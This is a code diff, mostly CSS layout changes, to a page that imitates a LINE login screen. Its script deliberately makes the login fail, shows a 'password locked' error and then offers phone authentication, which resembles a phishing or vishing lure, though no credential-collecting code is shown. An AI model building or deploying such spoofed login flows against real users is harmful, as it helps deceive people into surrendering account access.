@@ -46,13 +46,15 @@
         }
         
         .line-auth-container {
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            padding-top: 50px; /* ステータスバーとノッチの回避 */
             display: flex;
             flex-direction: column;
-            justify-content: center; /* 垂直方向の中央寄せ */
-            align-items: center; /* 水平方向の中央寄せ */
-            height: 100%;
             box-sizing: border-box;
-            background-color: white; /* 背景色を白に戻す */
+            position: relative;
+            overflow-y: auto;
         }
 
         .line-header-bar {
@@ -68,13 +70,27 @@
             font-weight: 600;
             color: #333;
             z-index: 5;
+            pointer-events: none; /* ヘッダーがクリックをブロックしないように */
         }
 
         .content {
-            text-align: center; /* コンテンツの中央寄せ */
-            padding: 0 40px 20px 40px;
+            padding: 0 5px 20px 5px;
             flex-grow: 1;
             margin-top: 55px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            height: 100%;
+        }
+
+        .line-logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .line-logo img {
+            width: 70px;
+            height: 70px;
+            border-radius: 15px;
         }
 
         h3 {
@@ -108,8 +124,6 @@
         .btn-primary {
             width: 90%;
             margin: 0 auto;
-
-            width: 100%;
             padding: 16px;
             background-color: #00b900;
             color: white;
@@ -130,14 +144,13 @@
             background-color: #ffbaba;
             padding: 10px;
             border-radius: 8px;
-            margin-bottom: 20px;
+            margin: 0 auto 20px auto;
             display: none;
             text-align: center;
             font-weight: 500;
             border: 1px solid #d8000c;
-            margin-left: 4px; /* 左余白 */
-            margin-right: 4px; /* 右余白 */
-            white-space: pre-line; /* 改行を有効にする */
+            width: 90%;
+            box-sizing: border-box;
         }
 
         .success-message {
@@ -155,7 +168,7 @@
         .alt-auth-option {
             text-align: center;
             margin-top: 30px;
-            padding: 0 20px;
+            padding: 0 10px;
         }
 
         .alt-auth-option p {
@@ -211,11 +224,26 @@
         .call-icon {
             font-size: 40px;
         }
-
-        #step-1 {
-            margin-top: 20px; /* 位置を20px下げる */
+    #step-2 {
+            padding: 0 5px 20px 5px;
+            min-height: calc(100% - 55px); /* header分を除外 */
+            display: none; /* 初期は非表示、JSでflexに変更 */
+            flex-direction: column;
+            justify-content: center;
+            box-sizing: border-box;
         }
-    </style>
+    #step-1 {
+    text-align: center;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+}
+#code-error {
+    margin-top: 10px; /* ボタンとの間を10px空ける（エラーはボタンの下に表示されるため上余白で調整） */
+    margin-bottom: 0;
+}
+</style>
 </head>
 <body>
 
@@ -225,17 +253,18 @@
             <div class="line-header-bar" id="step-title">LINEで認証</div>
 
             <div class="content">
+                
+
                 <div id="step-1">
     <h3>サービスにログイン</h3>
-    <button class="btn-primary" onclick="tryLineAuth()">LINEでログイン</button>
+    <button class="btn-primary" type="button" onclick="tryLineAuth()">LINEでログイン</button>
 </div>
                     
                 </div>
 
                 <div id="step-2" style="display: none;">
                     <div class="error-message" id="error-msg">
-                        認証に失敗しました。
-                        パスワードがロックされています。
+                        認証に失敗しました。<br>パスワードがロックされています。
                     </div>
                     
                     <div class="alt-auth-option">
@@ -288,9 +317,13 @@
             // 認証失敗をシミュレート
             stepTitle.textContent = 'LINE認証失敗';
             step1.style.display = 'none';
-            
+
+            // 初期画面全体を隠し、失敗画面を中央寄せで表示
+            const contentEl = document.querySelector('.content');
+            if (contentEl) contentEl.style.display = 'none';
+
             errorMsg.style.display = 'block';
-            step2.style.display = 'block';
+            step2.style.display = 'flex'; // 中央寄せのためflexで表示
             voiceAuthBtn.style.display = 'block'; // 電話認証ボタンを表示
         }
 
